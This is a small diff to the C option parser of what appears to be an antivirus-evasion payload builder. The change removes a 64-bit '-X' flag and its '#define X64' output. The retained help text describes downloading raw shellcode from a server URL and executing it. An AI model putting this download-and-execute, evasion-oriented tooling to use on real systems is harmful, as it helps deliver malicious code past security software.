@@ -27,7 +27,6 @@ int main (int argc, char **argv)
 	char *uvalue = NULL;
 	char *wvalue = NULL;
 	int hflag = 0;	
-	int Xflag = 0;
 	int Eflag = 0;	
 	char *dvalue = NULL;
 
@@ -60,10 +59,7 @@ int main (int argc, char **argv)
 				break;
 			case 'h':
 				hflag = 1;
-				break;			
-			case 'X':
-				Xflag = 1;
-				break;
+				break;				
 			case 'E':
 				Eflag = 1;
 				break;					
@@ -181,11 +177,7 @@ int main (int argc, char **argv)
 
 	//write LVALUE to defs.h
 	if(print_debug)
-		fprintf (file_def, "#define PRINT_DEBUG\n");	
-
-	//write X64 to defs.h
-	if(Xflag)
-		fprintf (file_def, "#define X64\n");
+		fprintf (file_def, "#define PRINT_DEBUG\n");		
 	
 	//write ENCRYPT to defs.h
 	if(Eflag)
@@ -221,8 +213,7 @@ void print_help()
 	printf("      for executing the raw shellcode after downloading\n");
 	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
-	printf("   Can be used with -l\n");	
-	printf("-X compile for 64 bit\n");
+	printf("   Can be used with -l\n");		
 	printf("-p print debug information\n");	
 	printf("-h help\n\n");
 	printf("Please refer README.md for more information\n");
